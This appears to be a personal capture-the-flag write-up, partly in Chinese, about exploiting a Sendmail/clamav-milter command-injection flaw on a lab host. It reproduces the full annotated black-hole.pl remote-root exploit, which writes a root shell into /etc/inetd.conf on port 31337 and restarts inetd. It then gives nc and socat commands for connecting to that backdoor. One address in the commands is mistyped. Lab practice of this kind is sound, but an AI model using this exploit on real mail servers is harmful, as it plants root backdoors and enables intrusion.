- **_Given that the challenge is called “ClamAV,” we choose to use searchsploit against it. What we discover is as follows:_**
- ALWAYS USE searchsploit against name


- Sendmail 是一个广泛使用的邮件传输代理（MTA）。
- clamav-milter 是 ClamAV 杀毒软件的邮件过滤器，用于扫描邮件中的病毒和恶意代码。
- 低版本的 clamav-milter（< 0.91.2）在处理邮件时存在安全缺陷。

2. 漏洞原理：

- 攻击者可以通过发送特制的邮件，利用 clamav-milter 处理邮件时的输入验证缺陷。
- 该缺陷允许攻击者注入恶意命令，并在邮件服务器上以 clamav-milter 的权限执行。
- 由于 Sendmail 和 clamav-milter 通常运行在高权限账户（如 root 或 mail 用户），攻击者能够远程执行任意命令。

```Perl
### black-hole.pl
### Sendmail w/ clamav-milter Remote Root Exploit
### Copyright (c) 2007 Eliteboy
########################################################
use IO::Socket; # Import the IO::Socket module for network communication.

print "Sendmail w/ clamav-milter Remote Root Exploit\n";
print "Copyright (C) 2007 Eliteboy\n";

if ($\#ARGV != 0) { # Check if exactly one command-line argument (the target host) is provided.
    print "Give me a host to connect.\n"; # If not, print an error message and exit.
    exit;
}

print "Attacking $ARGV[0]...\n"; # Print a message indicating the target host.

$sock = IO::Socket::INET->new( # Create a new TCP socket connection to the target host.
    PeerAddr => $ARGV[0], # The target host's IP address or hostname.
    PeerPort => '25',    # The SMTP port (25).
    Proto    => 'tcp'      # Use the TCP protocol.
);

print $sock "ehlo you\r\n"; # Send the EHLO command to initiate an extended SMTP session.
print $sock "mail from: <>\r\n"; # Send the MAIL FROM command to specify the sender (empty sender).
# The following two lines contain the exploit:
print $sock "rcpt to: <nobody+\"|echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf\"@localhost>\r\n"; # Inject a command that adds a backdoor to inetd.conf.
# This line attempts to add a line to /etc/inetd.conf that launches a root shell on port 31337.
print $sock "rcpt to: <nobody+\"|/etc/init.d/inetd restart\"@localhost>\r\n"; # Inject a command to restart inetd, loading the backdoor.
# This line attempts to restart the inetd service so that the backdoor takes effect.
print $sock "data\r\n.\r\nquit\r\n"; # Send the DATA command, followed by a dot (.) to indicate the end of the message, and QUIT to close the connection.

while (<$sock>) { # Read and print the server's responses.
    print;
}

# milw0rm.com [2007-12-21] # Source of the exploit (milw0rm was a vulnerability database).
```

nc 192.168.146.42 31337

  

If the `black-hole.pl` exploit is successful against a vulnerable Sendmail/clamav-milter setup, and you then use `nc 192.168.146.42 31337`, you get a shell because of the following sequence of events:

1. **Exploit Execution:**
    - The Perl script injects a command into the target system's `/etc/inetd.conf` file.
    - That injected command tells `inetd` to listen on port 31337.
    - When a connection is made to that port, `inetd` is configured to execute `/bin/sh -i`.
    - The script also restarts the `inetd` service, so it re-reads its configuration file, thus activating the malicious configuration.
2. `**inetd**` **Listening:**
    - After the script runs, `inetd` is actively listening on port 31337.
3. `**nc**` **Connection:**
    - When you run `nc 192.168.146.42 31337`, you are establishing a TCP connection to port 31337 of the target system (192.168.146.42).
4. **Shell Execution:**
    - `inetd` detects the incoming connection.
    - As configured by the exploit, `inetd` executes `/bin/sh -i`.
    - `/bin/sh -i` starts an interactive shell.
    - The standard input and output of this shell are tied to the TCP connection that you established with `nc`.
5. **Interactive Shell:**
    - Therefore, anything you type into your `nc` terminal is sent to the shell on the remote system.
    - Any output from the remote shell is sent back to your `nc` terminal.
    - This gives you a remote, interactive root shell on the target system.

**In essence:**

- The exploit sets up a backdoor.
- `nc` connects to the backdoor.
- The backdoor launches a shell, and connect it to your nc session.

This is a classic example of how a remote command injection vulnerability can be used to gain complete control over a system.

  

```Perl
socat TCP:192.168.146.42:31337 -
or nc 92.168.146.42 31337
```